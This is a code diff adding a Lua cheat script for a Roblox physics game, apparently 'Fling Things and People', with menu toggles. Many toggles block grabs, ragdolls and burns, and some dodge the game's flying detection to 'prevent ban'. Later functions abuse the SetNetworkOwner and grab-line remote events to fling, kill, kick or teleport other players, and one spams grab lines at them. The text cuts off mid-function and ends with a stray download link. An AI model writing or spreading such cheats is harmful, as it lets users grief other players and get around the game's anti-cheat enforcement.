+        selectedGucciType = gucciTypes[Value] or 'CreatureBlobman'
+    end
+})
+
+DefenseGroup:CreateToggle({
+    Name = "[GUCCI] Anti Grab",
+    Tooltip = 'Makes you unable to be touched by anyone or anything.',
+    Default = false,
+    Callback = function(Value)
+        GUE = Value
+        if Value then
+            task.spawn(gucciblob)
+        else
+            if itm and itm.Parent then
+                task.spawn(function()
+                    DestroyToy:FireServer(itm)
+                end)
+            end
+            itm = nil
+        end
+    end
+})
+
+local autoGucciActiveTrain =  false
+DefenseGroup:CreateToggle({
+	Name = "Anti Gucci (Train)",
+        Flag = "Anti Gucci (Train)",
+	Default = false,
+	Callback = function(Value)
+        SetToggleState("Anti Gucci (Train)", Value)
+		autoGucciActiveTrain = Value
+		if Value then
+			startAntiGucciTrain()
+			notify("system", "Gucci active (monitoring)", 3)
+			task.spawn(function()
+				while autoGucciActiveTrain do
+					local trainFolder = workspace.Map.AlwaysHereTweenedObjects
+					local trainExists = trainFolder and trainFolder:FindFirstChild("Train")
+					if not trainExists then
+						stopAntiGucciTrain()
+						notify("System", "Train lost", 3)
+						local retries = 0
+						repeat
+							task.wait(0.2)
+							retries = retries + 1
+							trainFolder = workspace.Map.AlwaysHereTweenedObjects
+						until (trainFolder and trainFolder:FindFirstChild("Train")) or retries > 25 or not autoGucciActiveTrain
+						if autoGucciActiveTrain and trainFolder and trainFolder:FindFirstChild("Train") then
+							startAntiGucciTrain()
+							notify("System", "Train restored.", 3)
+						end
+					end
+					task.wait(0.5)
+				end
+			end)
+		else
+			autoGucciActiveTrain = false
+			stopAntiGucciTrain()
+			notify("System", "Gucci disabled.", 3)
+		end
+	end
+})
+
+-- Anti Ragdoll (On Blob)
+do
+    local AntiRagBlob = false
+    local RagdolledSit = false
+    local Cons = {}
+
+    local function ApplyAntiRagdoll(char)
+        if not char or not AntiRagBlob then return end
+        
+        local hum = char:WaitForChild("Humanoid", 5)
+        local HRP = char:WaitForChild("HumanoidRootPart", 5)
+        if not (hum and HRP) then return end
+        
+        if Cons["ARSeat"] then Cons["ARSeat"]:Disconnect() end
+        Cons["ARSeat"] = hum:GetPropertyChangedSignal("SeatPart"):Connect(function()
+            if hum.SeatPart and hum.SeatPart.Parent and hum.SeatPart.Parent.Name == "CreatureBlobman" and not RagdolledSit then
+                RagdolledSit = true
+                local Seat = hum.SeatPart
+                while not hum.Sit do task.wait() end
+                
+                ReplicatedStorage.CharacterEvents.RagdollRemote:FireServer(HRP, 3)
+                
+                local ragdolledVal = hum:FindFirstChild("Ragdolled")
+                while ragdolledVal and not ragdolledVal.Value and not hum.Sit do task.wait() end
+                
+                task.wait(0.4)
+                hum.Sit = false
+                Seat:Sit(hum)
+                
+                task.delay(0.25, function()
+                    while hum and hum.SeatPart do
+                        ReplicatedStorage.CharacterEvents.RagdollRemote:FireServer(HRP, 1)
+                        task.wait(0.05)
+                    end
+                    RagdolledSit = false
+                end)
+            end
+        end)
+    end
+
+    DefenseGroup:CreateToggle({
+        Name = "Anti Ragdoll (On Blob)",
+        Flag = "AntiRagdoll",
+        Default = false,
+        Callback = function(Value)
+            AntiRagBlob = Value
+            RagdolledSit = false
+            
+            if Cons["ARChar"] then Cons["ARChar"]:Disconnect() end
+            if Cons["ARSeat"] then Cons["ARSeat"]:Disconnect() end
+            
+            if AntiRagBlob then
+                ApplyAntiRagdoll(Player.Character)
+                Cons["ARChar"] = Player.CharacterAdded:Connect(ApplyAntiRagdoll)
+            end
+        end
+    })
+end
+
+
+DefenseGroup:CreateToggle({
+    Name = "anti snowball",
+    Flag = "LoopRagdoll",
+    Default = false,
+    Callback = function(Value)
+        SetToggleState("LoopRagdoll", Value)
+        loopRagdoll = Value
+        
+        if Value then
+            task.spawn(function()
+                while loopRagdoll and task.wait(0.05) do
+                    pcall(function()
+                        local char = Player.Character
+                        local hrp = char and char:FindFirstChild("HumanoidRootPart")
+                        if hrp then
+                            ReplicatedStorage.CharacterEvents.RagdollRemote:FireServer(hrp, 0.5)
+                        end
+                    end)
+                end
+            end)
+        end
+    end
+})
+antiblob = false
+antiblobConnection = nil
+truePosPart = nil
+
+DefenseGroup:CreateToggle({
+    Name = "Auto Reset",
+        Flag = "Auto Reset",
+    Default = false,
+    Callback = function(v)
+        SetToggleState("Auto Reset", Value)
+        -- Clear old connection
+        if _G.AutoResetCon then _G.AutoResetCon:Disconnect() end
+
+        if v then
+            _G.AutoResetCon = game:GetService("ReplicatedStorage").GameCorrectionEvents.GameCorrectionsNotify.OnClientEvent:Connect(function(r)
+                if r == "Flying" then
+                    local char = game:GetService("Players").LocalPlayer.Character
+                    local hum = char and char:FindFirstChildOfClass("Humanoid")
+                    
+                    if hum then
+                        Library:Notify("Auto Reset[Prevent Ban!]", 4)
+                        -- Break Joint/Health is more reliable for "Defense" than ChangeState
+                        char:BreakJoints() 
+                        hum.Health = 0
+                    end
+                end
+            end)
+        end
+    end
+})
+DefenseGroup:CreateToggle({
+    Name = "Auto Leave ",
+    Flag = "Auto Leave",
+    Default = false,
+    Callback = function(v)
+        SetToggleState("Auto Leave", v)
+        
+        -- Clear old connection to prevent memory leaks or duplicate firing
+        if _G.AutoLeaveCon then _G.AutoLeaveCon:Disconnect() end
+
+        if v then
+            local warnTimestamps = {} -- Table to track when warnings happen
+
+            _G.AutoLeaveCon = game:GetService("ReplicatedStorage").GameCorrectionEvents.GameCorrectionsNotify.OnClientEvent:Connect(function(r)
+                if r == "Flying" then
+                    local currentTime = os.clock()
+                    table.insert(warnTimestamps, currentTime)
+
+                    -- Clean up timestamps that are older than 1 second
+                    for i = #warnTimestamps, 1, -1 do
+                        if currentTime - warnTimestamps[i] > 1 then
+                            table.remove(warnTimestamps, i)
+                        end
+                    end
+
+                    -- If 3 or more warnings happened in the last second, auto-leave
+                    if #warnTimestamps >= 3 then
+                        game:GetService("Players").LocalPlayer:Kick("XOCU Safety: Disconnected to prevent ban.")
+                    end
+                end
+            end)
+        end
+    end
+})
+DefenseGroup:CreateToggle({
+    Name = "Anti Void",
+        Flag = "Anti Void",
+    Default = false,
+    Callback = function(v)
+        SetToggleState("Anti Void", Value)
+        if v then
+            workspace.FallenPartsDestroyHeight = 0/0
+        else
+            workspace.FallenPartsDestroyHeight = -100
+        end
+    end
+})
+
+local RunService = game:GetService("RunService")
+local plr = game:GetService("Players").LocalPlayer
+local rs = game:GetService("ReplicatedStorage")
+
+local notifyCooldowns = {}
+local AntiBlobConnection = nil
+local AntiBlobT = false
+
+function CheckBlob(blob, myHRP, myAttach, humanoid, source)
+    local script = blob:FindFirstChild("BlobmanSeatAndOwnerScript")
+    if not script then return end
+
+    for _, side in ipairs({"Left", "Right"}) do
+        local detector = blob:FindFirstChild(side .. "Detector")
+        if not detector then continue end
+
+        local weld = detector:FindFirstChild(side .. "Weld")
+        local align = detector:FindFirstChild(side .. "AlignOrientation")
+
+        if weld and weld:IsA("AlignPosition") and weld.Attachment0 == myAttach then
+            local msg = source .. " â†’ " .. side .. " Grab"
+            local now = tick()
+
+            if not notifyCooldowns[msg] or (now - notifyCooldowns[msg]) >= 2 then
+    notifyCooldowns[msg] = now
+    notify("[ âœŠ ]", msg, 3)
+            end
+
+            local success, errorMsg = pcall(function()
+                rs.CharacterEvents.RagdollRemote:FireServer(myHRP, 0)
+
+                local myChar = plr.Character
+                if not myChar then return end
+
+                local myHD = myChar:FindFirstChild("Head")
+                local myLA = myChar:FindFirstChild("Left Arm")
+                local myRA = myChar:FindFirstChild("Right Arm")
+                local myLL = myChar:FindFirstChild("Left Leg")
+                local myLR = myChar:FindFirstChild("Right Leg")
+
+                if humanoid then
+                    humanoid.PlatformStand = true
+                end
+
+                local bodyParts = {}
+
+                if myHRP then table.insert(bodyParts, myHRP) end
+                if myHD then table.insert(bodyParts, myHD) end
+                if myLA then table.insert(bodyParts, myLA) end
+                if myRA then table.insert(bodyParts, myRA) end
+                if myLL then table.insert(bodyParts, myLL) end
+                if myLR then table.insert(bodyParts, myLR) end
+
+                for _, part in ipairs(bodyParts) do
+                    part.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
+                    part.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
+                end
+
+                align.Attachment0 = nil
+                weld.Attachment0 = nil
+                weld.Enabled = false
+                align.Enabled = false
+
+                for _, part in ipairs(bodyParts) do
+                    part.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
+                    part.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
+                end
+
+                weld.Enabled = true
+                align.Enabled = true
+
+                if humanoid then
+                    humanoid.PlatformStand = false
+                end
+
+                for _, part in ipairs(bodyParts) do
+                    part.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
+                    part.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
+                end
+            end)
+
+            if not success then
+                warn("CheckBlob: " .. errorMsg)
+            end
+        end
+    end
+end
+
+function AntiBlobF()
+    if AntiBlobConnection then
+        AntiBlobConnection:Disconnect()
+        AntiBlobConnection = nil
+    end
+
+    AntiBlobConnection = RunService.Stepped:Connect(function()
+        if not AntiBlobT then
+            if AntiBlobConnection then
+                AntiBlobConnection:Disconnect()
+                AntiBlobConnection = nil
+            end
+            return
+        end
+
+        local myChar = plr.Character
+        if not myChar then return end
+        local humanoid = myChar:FindFirstChild("Humanoid")
+        local myHRP = myChar:FindFirstChild("HumanoidRootPart")
+
+        local myAttach = myHRP and myHRP:FindFirstChild("RootAttachment")
+
+        if not (myHRP and myAttach) then
+            return
+        end
+
+        local inv = workspace:FindFirstChild(plr.Name .. "SpawnedInToys")
+        if inv then
+            for _, blob in ipairs(inv:GetChildren()) do
+                if blob.Name == "CreatureBlobman" then
+                    local occupantName = "{me}"
+                    local vehicleSeat = blob:FindFirstChild("VehicleSeat")
+                    if vehicleSeat and vehicleSeat.Occupant then
+                        local character = vehicleSeat.Occupant.Parent
+                        if character then
+                            local player = game.Players:GetPlayerFromCharacter(character)
+                            if player then
+                                occupantName = player.Name
+                            end
+                        end
+                    end
+                    CheckBlob(blob, myHRP, myAttach, humanoid, occupantName)
+                end
+            end
+        end
+
+        for _, player in ipairs(game.Players:GetPlayers()) do
+            if player ~= plr then
+                local invs = workspace:FindFirstChild(player.Name .. "SpawnedInToys")
+                if invs then
+                    for _, blob in ipairs(invs:GetChildren()) do
+                        if blob.Name == "CreatureBlobman" then
+                            local occupantName = player.Name
+                            local vehicleSeat = blob:FindFirstChild("VehicleSeat")
+                            if vehicleSeat and vehicleSeat.Occupant then
+                                local character = vehicleSeat.Occupant.Parent
+                                if character then
+                                    local occupantPlayer = game.Players:GetPlayerFromCharacter(character)
+                                    if occupantPlayer then
+                                        occupantName = occupantPlayer.Name
+                                    end
+                                end
+                            end
+                            CheckBlob(blob, myHRP, myAttach, humanoid, occupantName)
+                        end
+                    end
+                end
+            end
+        end
+
+        local plots = workspace:FindFirstChild("PlotItems")
+        if plots then
+            for i = 1, 5 do
+                local plot = plots:FindFirstChild("Plot" .. i)
+                if plot then
+                    for _, blob in ipairs(plot:GetChildren()) do
+                        if blob.Name == "CreatureBlobman" then
+                            local occupantName = "Plot " .. i
+                            local vehicleSeat = blob:FindFirstChild("VehicleSeat")
+                            if vehicleSeat and vehicleSeat.Occupant then
+                                local character = vehicleSeat.Occupant.Parent
+                                if character then
+                                    local player = game.Players:GetPlayerFromCharacter(character)
+                                    if player then
+                                        occupantName = player.Name
+                                    end
+                                end
+                            end
+                            CheckBlob(blob, myHRP, myAttach, humanoid, occupantName)
+                        end
+                    end
+                end
+            end
+        end
+    end)
+end
+
+DefenseGroup:CreateToggle({
+    Name = "Anti Blob",
+    Flag = "AntiBlobKick",
+    Default = false,
+    Callback = function(Value)
+        AntiBlobT = Value
+        if AntiBlobT then
+            AntiBlobF()
+        end
+    end,
+})
+
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local LocalPlayer = Players.LocalPlayer
+
+-- Fix 1: Pull helper functions OUTSIDE the callback to prevent memory leaks
+local function OAA_getCharacter(player)
+    return player.Character
+end
+
+local function OAA_getHumanoidRootPart(character)
+    return character and character:FindFirstChild("HumanoidRootPart")
+end
+
+local function OAA_getHumanoid(character)
+    return character and character:FindFirstChild("Humanoid")
+end
+
+local function OAA_getDistance(part1, part2)
+    return (part1.Position - part2.Position).Magnitude
+end
+
+local function OAA_setNetworkOwner(part, cframe)
+    task.spawn(function()
+        -- Use FindFirstChild/WaitForChild safely
+        local grabEvents = ReplicatedStorage:FindFirstChild("GrabEvents")
+        if grabEvents then
+            local setNetworkOwnerRemote = grabEvents:FindFirstChild("SetNetworkOwner")
+            if setNetworkOwnerRemote then
+                setNetworkOwnerRemote:FireServer(part, cframe)
+            end
+        end
+    end)
+end
+
+-- Fix 2: Prevent DescendantAdded from stacking multiple connections
+local antiBlob1T = false
+local blobConnection = nil
+
+local function antiBlob1F()
+    antiBlob1T = true
+    if not blobConnection then
+        blobConnection = workspace.DescendantAdded:Connect(function(toy)
+            if toy.Name == "CreatureBlobman" and antiBlob1T then
+                -- Wait for child prevents errors if the detectors haven't loaded the exact microsecond the model spawns
+                local leftDetector = toy:WaitForChild("LeftDetector", 3)
+                local rightDetector = toy:WaitForChild("RightDetector", 3)
+                
+                if leftDetector then leftDetector:Destroy() end
+                if rightDetector then rightDetector:Destroy() end
+            end
+        end)
+    end
+end
+
+-- Fix 3: Use a connection variable to cleanly start/stop the Aura loop
+local auraConnection = nil
+
+DefenseGroup:CreateToggle({
+    Name = "Anti-Blobman Aura",
+    Flag = "Anti-Blobman Aura",
+    Default = false,
+    Callback = function(enabled)
+        -- Fix 4: Changed 'Value' to 'enabled'
+        if SetToggleState then
+            SetToggleState("Anti-Blobman Aura", enabled)
+        end
+
+        if enabled then
+            -- Clean up old loop just in case
+            if auraConnection then auraConnection:Disconnect() end
+            
+            -- Use Heartbeat for smooth, constant checking without freezing the UI thread
+            auraConnection = RunService.Heartbeat:Connect(function()
+                local myCharacter = OAA_getCharacter(LocalPlayer)
+                local myRootPart = OAA_getHumanoidRootPart(myCharacter)
+
+                if not myRootPart then return end -- Skip if we are dead/respawning
+
+                for _, player in pairs(Players:GetPlayers()) do
+                    if player ~= LocalPlayer then
+                        local playerCharacter = OAA_getCharacter(player)
+                        local playerRootPart = OAA_getHumanoidRootPart(playerCharacter)
+                        local playerHumanoid = OAA_getHumanoid(playerCharacter)
+
+                        if playerRootPart and playerHumanoid and playerHumanoid.SeatPart then
+                            local seatParent = playerHumanoid.SeatPart.Parent
+                            
+                            -- Check if riding Blobman and within range
+                            if seatParent and seatParent.Name == "CreatureBlobman" then
+                                if OAA_getDistance(playerRootPart, myRootPart) <= 19 then
+                                    OAA_setNetworkOwner(playerRootPart, playerRootPart.CFrame)
+                                end
+                            end
+                        end
+                    end
+                end
+            end)
+        else
+            -- Disconnect the loop cleanly when toggled off
+            if auraConnection then
+                auraConnection:Disconnect()
+                auraConnection = nil
+            end
+        end
+    end,
+})
+local antiExplodeT = false
+local function antiExplodeF()
+	antiExplodeT = true
+	local char = Player.Character
+	if not char then
+		return
+	end
+	local hrp = char:WaitForChild("HumanoidRootPart")
+	workspace.ChildAdded:Connect(function(model)
+		if model.Name == "Part" and antiExplodeT then
+			local mag = (model.Position - hrp.Position).Magnitude
+			if mag <= 20 then
+				hrp.Anchored = true
+				wait(0.01)
+				while char["Right Arm"].RagdollLimbPart.CanCollide do
+					wait(0.001)
+				end
+				hrp.Anchored = false
+			end
+		end
+	end)
+end
+DefenseGroup:CreateToggle({
+	Name = "Anti Explosion",
+        Flag = "Anti Explosion", 
+	Default = false,
+	Callback = function(on)
+        SetToggleState("Anti Explosion", on)
+		if on then
+			antiExplodeF()
+		else
+			antiExplodeT = false
+		end
+	end
+})
+local hookBurnConn
+local function hookBurn(char)
+	local hum = char:WaitForChild("Humanoid")
+	local hrp = char:WaitForChild("HumanoidRootPart")
+	char.PrimaryPart = hrp
+	if hookBurnConn then
+		hookBurnConn:Disconnect()
+	end
+	hookBurnConn = hum.FireDebounce.Changed:Connect(function(isBurning)
+		if isBurning then
+			local me = char
+			local oldCF = hrp.CFrame
+			local plots = workspace:FindFirstChild("Plots")
+			if plots and plots:FindFirstChild("Plot2") then
+				local plot2 = plots.Plot2
+				local barrier = plot2:FindFirstChild("Barrier")
+				local pb = barrier and barrier:FindFirstChild("PlotBarrier")
+				if pb and pb:IsA("BasePart") then
+					local safeCF = pb.CFrame * CFrame.new(0, 6, 0)
+					me:SetPrimaryPartCFrame(safeCF)
+					task.wait(0.3)
+					local firePart = me:FindFirstChild("FirePlayerPart", true)
+					if firePart then
+						for _, obj in ipairs(firePart:GetChildren()) do
+							if obj:IsA("Sound") then
+								obj:Stop()
+							end
+							if obj:IsA("Light") or obj:IsA("ParticleEmitter") then
+								obj.Enabled = false
+							end
+						end
+						if firePart:FindFirstChild("CanBurn") then
+							firePart.CanBurn.Value = false
+						end
+						if hum:FindFirstChild("FireDebounce") then
+							hum.FireDebounce.Value = false
+						end
+					end
+					task.wait(0.6)
+					if me and me.PrimaryPart then
+						me:SetPrimaryPartCFrame(oldCF)
+					end
+				end
+			end
+		end
+	end)
+end
+DefenseGroup:CreateToggle({
+	Name = "Anti Burn",
+        Flag = "Anti Burn",
+	Default = false,
+	Callback = function(on)
+        SetToggleState("Anti Burn", on)
+		if on then
+			hookBurn(Player.Character)
+		elseif hookBurnConn then
+			hookBurnConn:Disconnect()
+		end
+	end
+})
+
+local antiStickyT = false
+DefenseGroup:CreateToggle({
+	Name = "Anti Sticky",
+        Flag = "Anti Sticky",
+	Default = false,
+	Callback = function(Value)
+        SetToggleState("Anti Sticky", Value)
+		antiStickyT = Value
+		if Player.PlayerScripts:FindFirstChild("StickyPartsTouchDetection") then
+			Player.PlayerScripts.StickyPartsTouchDetection.Disabled = Value
+		end
+	end,
+})
+
+DefenseGroup:CreateToggle({
+	Name = "Anti Lag",
+        Flag = "Anti Lag",
+	Default = false,
+	Callback = function(Value)
+        SetToggleState("Anti Lag", Value)
+		if Value then
+			local grabFolder = ReplicatedStorage:FindFirstChild("GrabEvents")
+            -- ... (original deletion logic) ...
+		else
+			-- ... (original restoration logic) ...
+		end
+	end,
+})
+
+DefenseGroup:CreateToggle({
+	Name = "Anti Paint",
+        Flag = "Anti Paint",
+	Default = false,
+	Callback = function(state)
+        SetToggleState("Anti Paint", state)
+		if state then
+			deleteAllPaintParts()
+			watchNewPaintParts()
+			setTouchQuery(false)
+		else
+			restorePaintParts()
+			disconnectWatchers()
+			setTouchQuery(true)
+		end
+	end
+})
+
+do
+
+    local defenseEnabled = false
+    local defenseConnection = nil
+    local defenseMode = "Fling"
+    local crazyline = false
+    local crazylineTask = nil
+
+    local GrabEvents = game:GetService("ReplicatedStorage"):WaitForChild("GrabEvents")
+    local SetNetworkOwner = GrabEvents:WaitForChild("SetNetworkOwner")
+    local DestroyGrabLine = GrabEvents:FindFirstChild("DestroyGrabLine")
+    local CreateGrabEvent = GrabEvents:FindFirstChild("CreateGrabLine")
+    local Debris = game:GetService("Debris")
+
+    local function getAttacker()
+        local char = LocalPlayer.Character
+        if not char or not char:FindFirstChild("Head") then
+            return nil
+        end
+        local owner = char.Head:FindFirstChild("PartOwner")
+        if not owner or not owner:IsA("StringValue") then
+            return nil
+        end
+        return game:GetService("Players"):FindFirstChild(owner.Value)
+    end
+
+    local function performFling(attacker)
+        if not attacker or not attacker.Character then return end
+        local root = attacker.Character:FindFirstChild("HumanoidRootPart")
+        if not root then return end
+        pcall(function()
+            SetNetworkOwner:FireServer(root, root.CFrame)
+            if DestroyGrabLine then
+                DestroyGrabLine:FireServer(root)
+            end
+            local away = (root.Position - LocalPlayer.Character.HumanoidRootPart.Position).Unit
+            away = Vector3.new(away.X, 0, away.Z) * 90000
+            local bv = Instance.new("BodyVelocity")
+            bv.Name = "RinneganFling"
+            bv.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
+            bv.Velocity = away
+            bv.P = 12500
+            bv.Parent = root
+            Debris:AddItem(bv, 0.01)
+        end)
+    end
+
+    local function performKill(attacker)
+        if not attacker or not attacker.Character then return end
+        local root = attacker.Character:FindFirstChild("HumanoidRootPart")
+        if not root then return end
+        pcall(function()
+            SetNetworkOwner:FireServer(root, root.CFrame)
+            if DestroyGrabLine then
+                DestroyGrabLine:FireServer(root)
+            end
+            local away = (root.Position - LocalPlayer.Character.HumanoidRootPart.Position).Unit
+            away = Vector3.new(away.X, 0, away.Z) * 99999999999999
+            local bv = Instance.new("BodyVelocity")
+            bv.Name = "RinneganFling"
+            bv.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
+            bv.Velocity = away
+            bv.P = 12500
+            bv.Parent = root
+            Debris:AddItem(bv, 0.01)
+        end)
+    end
+
+    local function performHeaven(attacker)
+        if not attacker or not attacker.Character then return end
+        local root = attacker.Character:FindFirstChild("HumanoidRootPart")
+        if not root then return end
+        pcall(function()
+            SetNetworkOwner:FireServer(root, root.CFrame)
+            if DestroyGrabLine then
+                DestroyGrabLine:FireServer(root)
+            end
+            root.CFrame = CFrame.new(0, 200, 0)
+            local bv = Instance.new("BodyVelocity")
+            bv.Name = "RinneganHeaven"
+            bv.MaxForce = Vector3.new(0, math.huge, 0)
+            bv.Velocity = Vector3.new(0, 200, 0)
+            bv.P = 12500
+            bv.Parent = root
+            Debris:AddItem(bv, 0.01)
+        end)
+    end
+
+    local function performKick(attacker)
+        if not attacker or not attacker.Character then return end
+        local root = attacker.Character:FindFirstChild("HumanoidRootPart")
+        if not root then return end
+        pcall(function()
+            SetNetworkOwner:FireServer(root, root.CFrame)
+            if DestroyGrabLine then
+                DestroyGrabLine:FireServer(root)
+            end
+            root.CFrame = CFrame.new(0, 999999999999, 0)
+            local bv = Instance.new("BodyVelocity")
+            bv.Name = "RinneganHeaven"
+            bv.MaxForce = Vector3.new(0, math.huge, 0)
+            bv.Velocity = Vector3.new(0, 99999999999999, 0)
+            bv.P = 12500
+            bv.Parent = root
+            Debris:AddItem(bv, 0.01)
+        end)
+    end
+
+    local function performRagdoll(attacker)
+        if not attacker or not attacker.Character then return end
+        local root = attacker.Character:FindFirstChild("HumanoidRootPart")
+        if not root then return end
+        pcall(function()
+            SetNetworkOwner:FireServer(root, root.CFrame)
+            if DestroyGrabLine then
+                DestroyGrabLine:FireServer(root)
+            end
+            local bv = Instance.new("BodyVelocity")
+            bv.Name = "RinneganSpy"
+            bv.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
+            bv.Velocity = Vector3.new(0, -20, 0)
+            bv.P = 12500
+            bv.Parent = root
+            Debris:AddItem(bv, 0.01)
+        end)
+    end
+
+    local function performHell(attacker)
+        if not attacker or not attacker.Character then return end
+        local root = attacker.Character:FindFirstChild("HumanoidRootPart")
+        if not root then return end
+        pcall(function()
+            SetNetworkOwner:FireServer(root, root.CFrame)
+            if DestroyGrabLine then
+                DestroyGrabLine:FireServer(root)
+            end
+            for _, part in ipairs(attacker.Character:GetDescendants()) do
+                if part:IsA("BasePart") and not part.Anchored then
+                    part.CanCollide = false
+                end
+            end
+            local bv = Instance.new("BodyVelocity")
+            bv.Name = "RinneganSpy"
+            bv.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
+            bv.Velocity = Vector3.new(0, -100000000, 0)
+            bv.P = 12500
+            bv.Parent = root
+            local noclipConnection
+            noclipConnection = game:GetService("RunService").Heartbeat:Connect(function()
+                if not attacker.Character or not attacker.Character.Parent then
+                    noclipConnection:Disconnect()
+                    return
+                end
+                for _, part in ipairs(attacker.Character:GetDescendants()) do
+                    if part:IsA("BasePart") and not part.Anchored then
+                        part.CanCollide = false
+                    end
+                end
+            end)
+            task.delay(0.01, function()
+                if noclipConnection then
+                    noclipConnection:Disconnect()
+                end
+            end)
+            Debris:AddItem(bv, 0.01)
+        end)
+    end
+
+    local function performChina(attacker)
+        if not attacker or not attacker.Character then return end
+        local root = attacker.Character:FindFirstChild("HumanoidRootPart")
+        if not root then return end
+        pcall(function()
+            SetNetworkOwner:FireServer(root, root.CFrame)
+            if DestroyGrabLine then
+                DestroyGrabLine:FireServer(root)
+            end
+            root.CFrame = CFrame.new(591, 153, -101)
+        end)
+    end
+
+    local function performSpamGrabLines(attacker)
+        while crazyline do
+            pcall(function()
+                local char = LocalPlayer.Character
+                if char then
+                    local head = char:FindFirstChild("Head")
+                    if head then
+                        local owner = head:FindFirstChild("PartOwner")
+                        if owner and owner:IsA("StringValue") then
+                            local attacker = game:GetService("Players"):FindFirstChild(owner.Value)
+                            if attacker and attacker.Character then
+                                local attackerHead = attacker.Character:FindFirstChild("Head")
+                                local attackerHRP = attacker.Character:FindFirstChild("HumanoidRootPart")
+                                if attackerHead and attackerHRP then
+                                    for i = 1, 10 do
+                                        pcall(function()
+                                            CreateGrabEvent:FireServer(attackerHead, attackerHead.CFrame)
+                                        end)
+                                    end
+                                    for i = 1, 10 do
+                                        pcall(function()
+                     …"
+ content://media/external/downloads/1000055205#:~:text=local%20Players%20%3D%20game,so%20goated%22)%0A%0Aend
